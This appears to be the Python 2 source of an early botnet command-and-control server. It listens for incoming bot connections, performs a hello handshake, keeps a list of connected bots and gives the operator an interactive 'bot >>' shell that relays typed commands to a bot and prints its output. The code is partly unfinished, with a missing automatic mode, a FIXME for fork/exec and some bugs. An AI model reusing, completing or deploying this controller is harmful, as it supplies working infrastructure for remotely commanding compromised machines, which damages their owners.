#!/usr/bin/env python

import errno
import socket
import time
import sys

from common import *

MAX_BACKLOG = 4

class botlist:
  def __init__(self, conn, addr):
    self.conn = conn
    self.addr = addr


class bot_master:
  
  sock = None

  def __init__(self):
    self.botlist = []
    pass
  
  def run(self, manually = False):
    if (self.start_listen() == False):
      return

    #FIXME: there need to write some 
    # fork/exec functions
    D("[+] try to catch connections...")
    
    (conn, addr) = self.sock.accept()
    D("[+] accept connection")

    self.botlist.append(botlist(conn, addr))
    
    if self.hand_shake(conn) == False:
      self.sock.close()
      self.sock = None
      D("[-] hand shake fail, conn closed")
      return False

    if (manually == True):
      self.get_cli(conn)
    else:
      print "write automatic functions plz"
      return False
    D("out from main loop")
    return True

  def hand_shake(self, sock):
    sock.setblocking(1)

    ack = sock_recv_async(sock, PACK_SZ)
    if ack == None:
      return False

    if ack != HELLO_MSG:
      D('[-] HELLO message incorrect ack = %s' % ack)
      return False

    print "[+] ack recieved"
    sock.sendall(HELLO_ACK)
  
  def get_cli(self, sock):
    prev = sock.gettimeout()
    sock.settimeout(0.5)
    sock.sendall("get_cli\n")

    ret = sock_recv_async(sock, PACK_SZ)
    if ret == None:
      return False

    while True:
      D("next CLI iter")
      try:

        #recieving output
        while True:
          try:
	          ack = sock.recv(PACK_SZ)
	          if len(ack) == 0:
	    	      break
	          sys.stdout.write(ack)
          except socket.timeout:
            break
        sys.stdout.write("\n")
        sys.stdout.write("bot >> ")
        
        #get next cmd
        ln = sys.stdin.readline()
        sock.sendall(ln)
        print "msg send success"

      	if ln == "EXIT\n":
	        break

        
      except Exception as err:
        D("iter fail %s" % err);
        sock.settimeout(prev)
        return False;
    sock.settimeout(prev)
    D("get cli end");
    pass

  def start_listen(self):
    if self.sock != None:
      D("listening already inited...")
      return False;
    try:
      self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM);
    except:
      D("netbot init connection fail:(")
      print err;
      self.sock = None;
      return False;
    D("[+]socket.socket success")
    
    co = (SERV_IP, SERV_PORT)
    try: self.sock.bind(co);
    except Exception as err: 
      D("[-] socket.bind failed");
      print err;
      self.stop_listen();
      return False;
    D("[+]socket.bind success")

    self.sock.listen(MAX_BACKLOG)

    D("[+]socket.listen success")
    return True

  def stop_listen(self):
    if self.sock != None:
      self.sock.close()
    self.sock = None
    pass;
  
  def traverse(self, func):
    for bot in self.botlist:
      func(bot)

  def print_botlist(self):
    for bot in self.botlist:
      print "bot ip = %s port = %d" % (bot.addr[0], bot.addr[1])


def sock_recv_async(sock, size):
  while True:
    try:
      ret = sock.recv(size, socket.MSG_DONTWAIT)
    except socket.timeout:
      time.sleep(0.3)
      D('socket timeouted')
      continue
    except socket.error as err:
      if (err.errno != errno.EAGAIN):
        D('unrecognised socket error %s' % err)
        print type(err)
        return None
      D('sock timeout')
      time.sleep(0.3)
      continue
    except:
      return None
    break
  return ret

def test_master():
  """
  simple testing routine
  """
  
  mymaster = bot_master()
  mymaster.run(manually = True)
  mymaster.print_botlist();
  
  del(mymaster)

if __name__ == "__main__":
  test_master()
